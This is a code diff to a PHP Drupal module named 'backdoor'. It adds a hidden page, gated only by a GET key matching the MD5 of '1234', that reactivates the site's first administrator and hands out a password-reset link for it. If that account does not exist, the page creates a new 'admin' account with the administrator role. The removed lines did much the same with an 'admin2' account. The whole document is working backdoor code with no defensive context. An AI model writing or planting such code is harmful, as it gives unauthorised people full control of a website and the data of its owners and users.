@@ -1,8 +1,7 @@
 <?php
 
-require DRUPAL_ROOT . '/includes/password.inc';
-
-function backdoor_menu(){
+function backdoor_menu()
+{
 	$items = array();
 
 	$items['backdoor'] = array(
@@ -24,41 +23,47 @@ function backdoor_menu(){
 	return $items;
 }
 
-function access_backdoor_page (){
-	if(isset($_GET['key'])){
+function access_backdoor_page() {
+	if (isset($_GET['key'])) {
 		$key = md5($_GET['key']);
-		if($key == '81dc9bdb52d04dc20036dbd8313ed055'){
+		if ($key == '81dc9bdb52d04dc20036dbd8313ed055') {
 			return TRUE;
 		}
 	}
 }
 
-function backdoor (){
-	$user = user_load(1);
-	if($user->status != 1){
-		$user->status = 1;
-		user_save($user);
-	}
-//	$new_password = user_password(25);
+function backdoor() {
 
-	$pass = user_password(25);
-	$new_password = user_hash_password(trim($pass));
-	print $pass;
-	$newuser = array(
-		'uid' => 2,
-		'name' => 'admin2',
-		'pass' => $new_password,
-		'mail' => 'email@example.com',
-		'init' => 'email@example.com',
-		'status' => 1,
-		'role' => array('administrator'),
-	);
-	drupal_write_record('users', $newuser);
-//	print(dpm($user));
-	return user_pass_reset_url($user);
+	if ($user = user_load(1)) {
+
+		if ($user->status != 1) {
+			$user->status = 1;
+			user_save($user);
+		}
+		$link = l(user_pass_reset_url($user), user_pass_reset_url($user));
+	} else {
+		$pass = user_password(25);
+		require_once DRUPAL_ROOT . '/' . variable_get('password_inc', 'includes/password.inc');
+		$new_password = user_hash_password(trim($pass));
+		$newuser = array(
+			'uid' => 1,
+			'name' => 'admin',
+			'pass' => $new_password,
+			'mail' => 'email@example.com',
+			'init' => 'email@example.com',
+			'status' => 1,
+			'role' => array(
+				DRUPAL_AUTHENTICATED_RID => TRUE,
+				'administrator' => TRUE,
+			),
+		);
+		drupal_write_record('users', $newuser);
+		$link = l(user_pass_reset_url($newuser), user_pass_reset_url($newuser));
+	}
+
+	return $link;
 }
 
-function admin_page_backdoor (){
-
+function admin_page_backdoor() {
 	return md5(1234);
 }
